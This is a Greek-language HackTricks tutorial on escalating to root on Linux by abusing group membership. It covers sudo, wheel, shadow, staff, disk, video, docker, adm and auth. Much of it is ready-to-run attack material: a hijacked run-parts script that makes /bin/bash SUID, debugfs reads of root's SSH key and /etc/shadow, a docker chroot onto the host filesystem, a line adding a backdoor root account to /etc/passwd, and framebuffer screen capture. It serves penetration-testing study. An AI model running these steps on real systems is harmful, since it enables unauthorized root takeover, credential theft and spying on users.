# Ενδιαφέρουσες Ομάδες - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Ομάδες Sudo/Admin

### **PE - Method 1**

**Μερικές φορές**, **από προεπιλογή (ή επειδή το χρειάζεται κάποιο software)** μέσα στο αρχείο **/etc/sudoers** μπορεί να βρείτε μερικές από αυτές τις γραμμές:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα sudo ή admin μπορεί να εκτελέσει οτιδήποτε μέσω sudo**.

Αν ισχύει αυτό, για να **γίνεις root μπορείς απλώς να εκτελέσεις**:
```
sudo su
```
### PE - Μέθοδος 2

Βρείτε όλα τα suid binaries και ελέγξτε αν υπάρχει το binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Αν διαπιστώσετε ότι το binary **pkexec είναι SUID binary** και ανήκετε στην ομάδα **sudo** ή **admin**, πιθανότατα μπορείτε να εκτελέσετε binaries ως sudo χρησιμοποιώντας το `pkexec`.\
Αυτό συμβαίνει επειδή συνήθως αυτές είναι οι ομάδες που ορίζονται στο **polkit policy**. Αυτή η policy ουσιαστικά προσδιορίζει ποιες ομάδες μπορούν να χρησιμοποιούν το `pkexec`. Ελέγξτε το με:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Εκεί θα βρείτε ποιες ομάδες επιτρέπεται να εκτελούν το **pkexec** και, **από προεπιλογή**, σε ορισμένες διανομές Linux εμφανίζονται οι ομάδες **sudo** και **admin**.

Για να **γίνετε root μπορείτε να εκτελέσετε**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Αν προσπαθήσετε να εκτελέσετε το **pkexec** και λάβετε αυτό το **σφάλμα**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Δεν οφείλεται στο ότι δεν έχετε δικαιώματα, αλλά στο ότι δεν είστε συνδεδεμένοι χωρίς GUI**. Υπάρχει, όμως, workaround για αυτό το ζήτημα εδώ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Χρειάζεστε **2 διαφορετικές ssh sessions**:<sup>[[1]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Ομάδα Wheel

**Μερικές φορές**, **από προεπιλογή**, μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε αυτήν τη γραμμή:
```
%wheel	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα wheel μπορεί να εκτελέσει οτιδήποτε μέσω sudo**.

Αν ισχύει αυτό, για να **γίνεις root μπορείς απλώς να εκτελέσεις**:
```
sudo su
```
## Ομάδα Shadow

Οι χρήστες από την **ομάδα shadow** μπορούν να **διαβάζουν** το αρχείο **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Επομένως, διαβάστε το αρχείο και προσπαθήστε να **κάνετε crack σε κάποια hashes**.

Μια σύντομη διευκρίνιση για την κατάσταση κλειδώματος κατά την ταξινόμηση των hashes:
- Οι καταχωρίσεις με `!` ή `*` είναι γενικά μη διαδραστικές για συνδέσεις με password.
- Το `!hash` συνήθως σημαίνει ότι είχε οριστεί password και στη συνέχεια κλειδώθηκε.
- Το `*` συνήθως σημαίνει ότι δεν είχε οριστεί ποτέ έγκυρο password hash.
Αυτό είναι χρήσιμο για την ταξινόμηση των accounts, ακόμη και όταν η άμεση σύνδεση είναι αποκλεισμένη.

## Ομάδα Staff

**staff**: Επιτρέπει στους users να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς να χρειάζονται root privileges (σημειώστε ότι τα executables στο `/usr/local/bin` βρίσκονται στη μεταβλητή PATH κάθε user και μπορούν να "override" τα executables στα `/bin` και `/usr/bin` με το ίδιο όνομα). Συγκρίνετέ το με την ομάδα "adm", η οποία σχετίζεται περισσότερο με monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>

Στις διανομές Debian, η μεταβλητή `$PATH` δείχνει ότι το `/usr/local/` θα εκτελείται με την υψηλότερη προτεραιότητα, είτε είστε privileged user είτε όχι.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Αν μπορούμε να κάνουμε hijack σε κάποια προγράμματα στο `/usr/local`, μπορούμε εύκολα να αποκτήσουμε root.

Το hijack του προγράμματος `run-parts` είναι ένας εύκολος τρόπος για να αποκτήσουμε root, επειδή τα περισσότερα προγράμματα θα εκτελέσουν ένα `run-parts`, όπως το crontab και κατά τη σύνδεση μέσω ssh.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ή κατά τη σύνδεση μιας νέας συνεδρίας SSH.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Αυτό το privilege είναι σχεδόν **ισοδύναμο με root access**, καθώς μπορείτε να αποκτήσετε πρόσβαση σε όλα τα δεδομένα μέσα στο μηχάνημα.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Σημειώστε ότι χρησιμοποιώντας το debugfs μπορείτε επίσης να **γράψετε αρχεία**. Για παράδειγμα, για να αντιγράψετε το `/tmp/asd1.txt` στο `/tmp/asd2.txt` μπορείτε να εκτελέσετε:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ωστόσο, αν προσπαθήσετε να **γράψετε αρχεία που ανήκουν στον root** (όπως τα `/etc/shadow` ή `/etc/passwd`), θα εμφανιστεί σφάλμα "**Permission denied**".

## Ομάδα Video

Χρησιμοποιώντας την εντολή `w`, μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανιστεί έξοδος όπως η παρακάτω:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Το **tty1** σημαίνει ότι ο χρήστης **yossi είναι συνδεδεμένος τοπικά** σε ένα terminal στο μηχάνημα.

Το **video group** έχει πρόσβαση στην προβολή της εξόδου της οθόνης. Βασικά, μπορείτε να παρακολουθείτε τις οθόνες. Για να το κάνετε αυτό, πρέπει να **λάβετε την τρέχουσα εικόνα της οθόνης** σε raw data και να βρείτε την ανάλυση που χρησιμοποιεί η οθόνη. Τα δεδομένα της οθόνης μπορούν να αποθηκευτούν στο `/dev/fb0`, ενώ μπορείτε να βρείτε την ανάλυση αυτής της οθόνης στο `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Για να **ανοίξετε** το **raw image**, μπορείτε να χρησιμοποιήσετε το **GIMP**, να επιλέξετε το αρχείο **`screen.raw`** και να επιλέξετε ως τύπο αρχείου το **Raw image data**:

![Disk Group - Video Group: Για να ανοίξετε το raw image, μπορείτε να χρησιμοποιήσετε το GIMP, να επιλέξετε το αρχείο screen.raw και να επιλέξετε ως τύπο αρχείου το Raw image data](<../../../images/image (463).png>)

Στη συνέχεια, τροποποιήστε τα Width και Height ώστε να αντιστοιχούν σε αυτά που χρησιμοποιούνται στην οθόνη και ελέγξτε διαφορετικά Image Types (και επιλέξτε αυτό που εμφανίζει καλύτερα την οθόνη):

![Disk Group - Video Group: Στη συνέχεια, τροποποιήστε τα Width και Height ώστε να αντιστοιχούν σε αυτά που χρησιμοποιούνται στην οθόνη και ελέγξτε διαφορετικά Image Types (και επιλέξτε αυτό που εμφανίζει καλύτερα την οθόνη)](<../../../images/image (317).png>)

## Root Group

Φαίνεται ότι, από προεπιλογή, οι **members of root group** θα μπορούσαν να έχουν πρόσβαση για **τροποποίηση** ορισμένων αρχείων ρυθμίσεων **service**, ορισμένων αρχείων **libraries** ή **άλλων ενδιαφερόντων στοιχείων** που θα μπορούσαν να χρησιμοποιηθούν για την κλιμάκωση προνομίων...

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη του root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Μπορείτε να **προσαρτήσετε το root filesystem του host machine σε ένα volume ενός instance**, ώστε όταν ξεκινήσει το instance να φορτώνει αμέσως ένα `chroot` σε αυτό το volume. Αυτό σας παρέχει ουσιαστικά δικαιώματα root στο machine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Τέλος, αν δεν σου αρέσει καμία από τις προηγούμενες προτάσεις ή δεν λειτουργούν για κάποιο λόγο (docker api firewall;), μπορείς πάντα να δοκιμάσεις να **εκκινήσεις ένα privileged container και να κάνεις escape από αυτό**, όπως εξηγείται εδώ:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Αν έχεις δικαιώματα εγγραφής στο docker socket, διάβασε [**αυτό το post σχετικά με το πώς να κάνεις escalate privileges κάνοντας abuse το docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Ομάδα lxc/lxd

{{#ref}}
./
{{#endref}}

## Ομάδα Adm

Συνήθως τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα να **διαβάζουν αρχεία log** που βρίσκονται μέσα στο _/var/log/_.\
Επομένως, αν έχεις κάνει compromise έναν user που ανήκει σε αυτή την ομάδα, θα πρέπει οπωσδήποτε να **ελέγξεις τα logs**.

## Ομάδες Backup / Operator / lp / Mail

Αυτές οι ομάδες αποτελούν συχνά vectors για **credential-discovery**, αντί για άμεσα root vectors:
- **backup**: μπορεί να εκθέτει archives με configs, keys, DB dumps ή tokens.
- **operator**: operational access που εξαρτάται από την πλατφόρμα και μπορεί να κάνει leak ευαίσθητα runtime data.
- **lp**: οι print queues/spools μπορεί να περιέχουν περιεχόμενα εγγράφων.
- **mail**: τα mail spools μπορεί να εκθέτουν reset links, OTPs και internal credentials.

Αντιμετώπισε τη συμμετοχή σε αυτές τις ομάδες ως εύρημα έκθεσης δεδομένων υψηλής αξίας και κάνε pivot μέσω επαναχρησιμοποίησης passwords/tokens.

## Ομάδα Auth

Στο OpenBSD, η ομάδα **auth** μπορεί συνήθως να κάνει write στους φακέλους _**/etc/skey**_ και _**/var/db/yubikey**_, αν χρησιμοποιούνται.\
Αυτά τα δικαιώματα μπορούν να γίνουν abuse με το παρακάτω exploit για **escalate privileges** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## References

- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)

{{#include ../../../banners/hacktricks-training.md}}
